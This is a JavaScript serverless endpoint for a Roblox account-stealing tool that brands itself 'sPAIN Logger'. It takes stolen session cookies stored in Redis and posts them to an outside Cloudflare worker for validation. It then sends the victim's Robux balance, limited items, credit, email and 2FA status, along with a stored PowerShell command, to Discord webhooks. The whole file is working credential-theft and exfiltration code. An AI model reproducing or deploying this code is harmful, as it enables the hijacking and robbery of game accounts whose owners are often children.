// api/refresh.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getWorkerInfo(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = 'powershell') {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    await discordSend(url, {
      content: first
        ? `\`\`\`${lang}\n${chunk}${rem.length === 0 ? '\n```' : ''}`
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

async function sendToDiscord(webhookUrl, info, pageName) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `🧑 ${info.username} ${info.isPremium ? '⭐' : ''}`,
      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${info.id}/profile)`,
      color:       0xc026d3,
      thumbnail:   { url: info.avatarUrl },
      fields: [
        { name: '💰 Robux',      value: `\`${fmt(info.robux)} R$\``,                                                                     inline: true  },
        { name: '📊 Age',        value: `\`${info.accountAgeDays} days\``,                                                               inline: true  },
        { name: '👥 Groups',     value: `Owned: \`${info.groupsOwned}\` | R$: \`${fmt(info.groupRobux)}\``,                              inline: true  },
        { name: '👥 Friends',    value: `\`${info.friends}\``,                                                                           inline: true  },
        { name: '🛒 Limiteds',   value: `Count: \`${info.limitedsCount}\` | RAP: \`${fmt(info.limitedsValue)} R$\``,                     inline: true  },
        { name: '💳 Credit',     value: `\`${info.credit} USD\``,                                                                        inline: true  },
        { name: '⭐ Premium',    value: `\`${info.isPremium ? 'Yes' : 'No'}\``,                                                          inline: true  },
        { name: '⚙️ Account',    value: `Email: ${info.emailSet}\n2FA: ${info.twoFA}`,                                                   inline: true  },
        { name: '🎮 Gamepasses', value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'} | PLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '🕐 Refreshed',  value: `\`${now}\``,                                                                                    inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName}` }
    }]
  });
  if (info.powershell) await discordChunked(webhookUrl, info.powershell, 'powershell');
}

function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden}
  body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:0.5}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:48px 44px;width:100%;max-width:440px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:28px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  p{color:var(--muted);font-size:0.88rem;line-height:1.7;margin-bottom:36px}
  .btn{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:17px 0;border-radius:12px;font-family:'Orbitron',sans-serif;font-size:0.82rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 36px rgba(192,38,211,0.4);transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s}
  .btn:hover{transform:translateY(-2px);box-shadow:0 0 56px rgba(192,38,211,0.65)}
  .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
  .status{margin-top:18px;font-size:0.75rem;letter-spacing:0.06em;min-height:20px;color:var(--muted)}
  .status.ok{color:#4ade80}.status.err{color:#f472b6}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <p>Click below to fetch fresh account info and send it to Discord with a new PowerShell command.</p>
  <button class="btn" id="btn" onclick="send()">&#x1F504; Refresh &amp; Send to Discord</button>
  <div class="status" id="status"></div>
</div>
<script>
// ID is embedded server-side — no query param needed
const REFRESH_ID = '${id}';
async function send() {
  const btn = document.getElementById('btn');
  const st  = document.getElementById('status');
  btn.disabled = true;
  btn.textContent = 'Fetching...';
  st.className = 'status'; st.textContent = '';
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: REFRESH_ID })
    });
    const d = await r.json();
    if (d.success) {
      btn.textContent = '\\u2713 Sent to Discord!';
      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
      btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
      st.className = 'status ok';
      st.textContent = 'Account info + PowerShell sent to your webhook.';
      setTimeout(() => {
        btn.disabled = false;
        btn.textContent = '\\u{1F504} Refresh & Send to Discord';
        btn.style.background = ''; btn.style.boxShadow = '';
        st.textContent = ''; st.className = 'status';
      }, 4000);
    } else {
      btn.disabled = false;
      btn.textContent = '\\u{1F504} Refresh & Send to Discord';
      st.className = 'status err';
      st.textContent = d.error || 'Something went wrong.';
    }
  } catch {
    btn.disabled = false;
    btn.textContent = '\\u{1F504} Refresh & Send to Discord';
    st.className = 'status err';
    st.textContent = 'Network error. Try again.';
  }
}
</script>
</body>
</html>`;
}

// ── Parse body safely ─────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ── GET: serve the HTML page ──────────────────────────────────────────────
  if (req.method === 'GET') {
    // ID comes from Vercel rewrite query param: /r/:id → /api/refresh.js?id=$id
    const urlObj    = new URL('http://x' + req.url);
    const refreshId = urlObj.searchParams.get('id') || '';

    if (!refreshId) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Missing refresh ID</h1>');
    }

    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Link expired or not found</h1>');
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  // ── POST: regenerate info + send to Discord ───────────────────────────────
  if (req.method === 'POST') {
    // ID always comes from the request BODY — never the URL for POST
    const body   = parseBody(req.body);
    const postId = body?.id;

    if (!postId) return res.status(400).json({ error: 'id is required in body' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)        return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook)return res.status(500).json({ error: 'No webhook stored' });

    const info = await getWorkerInfo(record.cookie);
    if (!info) return res.status(502).json({ error: 'Cookie invalid or expired' });

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    await Promise.all(webhooks.map(wh => sendToDiscord(wh, info, record.pageName || postId)));

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
